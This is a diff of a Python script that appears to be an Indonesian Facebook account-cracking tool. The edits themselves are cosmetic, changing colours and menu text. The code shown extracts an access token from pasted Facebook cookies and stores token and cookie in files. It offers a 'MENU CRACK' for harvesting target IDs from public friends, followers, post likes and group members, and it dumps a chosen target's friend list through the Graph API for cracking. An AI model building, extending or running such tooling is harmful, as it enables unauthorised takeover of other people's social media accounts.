@@ -179,12 +179,12 @@ def login():
 def login_lagi334():
 	try:
 		banner()
-		___kontol___ = input('[★] Masukkan Cookies : ')
+		___kontol___ = input('[★] {k}Masukkan Cookies : ')
 		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":___kontol___}) 
 		find_token = re.search("(EAAG\w+)", data.text)
 		ken=open(".token.txt", "w").write(find_token.group(1))
 		cok=open(".cok.txt", "w").write(___kontol___)
-		print('\n LOGIN BERHASIL');time.sleep(1)
+		print('\n{h} LOGIN BERHASIL....\n{k}JALANKAN ULANG PERINTAHNYA');time.sleep(1)
 		exit()
 	except Exception as e:
 		os.system("rm -f .token.txt")
@@ -208,17 +208,17 @@ def menu(my_name,my_id):
 	sg = '# INFORMASI AKUN'
 	fx = mark(sg, style='yellow')
 	sol().print(fx)
-	print(x+'['+h+'•'+x+'] NAMA : '+str(my_name))
-	print(x+'['+h+'•'+x+']  ID     : '+str(my_id))
-	print(x+'['+h+'•'+x+'] IP   : '+str(sh['origin']))
-	io = '''[bold yellow][01] PUBLIC FRIENDS	     [06] CRACK FROM FILES
-[02] PUBLIC FRIENDS (BULK)   [07] CHECK CHECKPOINT OPTIONS
+	print(k+'['+h+'•'+k+'] NAMA : '+str(my_name))
+	print(k+'['+h+'•'+k+']  ID     : '+str(my_id))
+	print(k+'['+h+'•'+k+'] IP   : '+str(sh['origin']))
+	io = '''[bold yellow][01] PUBLIC 	     [06] CRACK FROM FILES
+[02] PUBLIC MASAL   [07] CHECK CHECKPOINT OPTIONS
 [03] FOLLOWER		     [08] CHECK CRACK RESULTS
 [04] LIKES THE POST	     [09] TIPS CRACK
 [05] GROUP MEMBERS           [00] LOGOUT[bold yellow]'''
 	oi = nel(io, style='yellow')
 	cetak(nel(oi, title='[bold yellow] • MENU CRACK • [/bold yellow]'))
-	ec = input(x+'['+p+'<>'+x+'] Pilih : ')
+	ec = input(k+'['+p+'<>'+k+'] Pilih : ')
 	if ec in ['1','01']:
 		dump_publik()
 	elif ec in ['2','02']:
@@ -240,7 +240,7 @@ def menu(my_name,my_id):
 	elif ec in ['0','00']:
 		os.system('rm -rf .token.txt')
 		os.system('rm -rf .cookie.txt')
-		print(x+'['+h+'•'+x+'] WAIT • • •')
+		print(k+'['+h+'•'+k+'] WAIT • • •')
 		time.sleep(1)
 		sw = '# SUCCESS OUT'
 		sol().print(mark(sw, style='yellow'))
@@ -451,8 +451,8 @@ def dump_publik():
 	win = '# DUMP PUBLIC ID'
 	win2 = mark(win, style='green')
 	sol().print(win2)
-	print(x+'['+h+'•'+x+'] KETIK "me" JIKA INGIN CRACK DARI ID SENDIRI')
-	pil = input(x+'['+p+'f'+x+']  ID TARGET : ')
+	print(k+'['+h+'•'+k+'] KETIK "me" JIKA INGIN CRACK DARI ID SENDIRI')
+	pil = input(k+'['+p+'f'+k+']  ID TARGET : ')
 	try:
 		koh2 = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': kukis}).json()
 		for pi in koh2['friends']['data']:
